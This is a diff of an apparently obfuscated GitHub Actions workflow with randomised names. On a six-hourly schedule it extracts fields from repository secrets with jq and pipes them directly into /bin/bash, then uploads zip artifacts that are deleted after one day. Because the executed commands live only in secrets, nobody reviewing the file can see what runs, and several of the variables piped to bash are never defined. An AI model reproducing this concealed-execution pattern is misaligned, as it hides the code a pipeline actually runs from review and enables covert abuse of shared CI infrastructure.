@@ -1,22 +1,26 @@
 name: zhuhoutianying
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '20 4/6 * * *'
-jobs:  # 15520
+    - cron: '38 0,6,12,18 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhuhoutianying
         env:
-          f985: ${{ secrets.f985 }}
+          g4: ${{ secrets.g4 }}
         run: |
-          echo $f985 | jq -r .lc4 | /bin/bash
-          echo $vnj293 | jq -r .ogz3 | /bin/bash
-          echo $pcxr2623 | jq -r .xzy4036 | /bin/bash
-          echo $ocl80 | jq -r .d86988 | /bin/bash
-          echo $sbtu32 | jq -r .d24935 | /bin/bash
+          printf '%s' "$g4" | jq -r .mqiai1884 | /bin/bash
+          printf '%s' "$vnv79" | jq -r .ivddl48 | /bin/bash
+          printf '%s' "$pu15" | jq -r .ki18666 | /bin/bash
+          printf '%s' "$pzgl39" | jq -r .jcuo2642 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: EQPb8E8J
+          path: "*.zip"
+          retention-days: 1
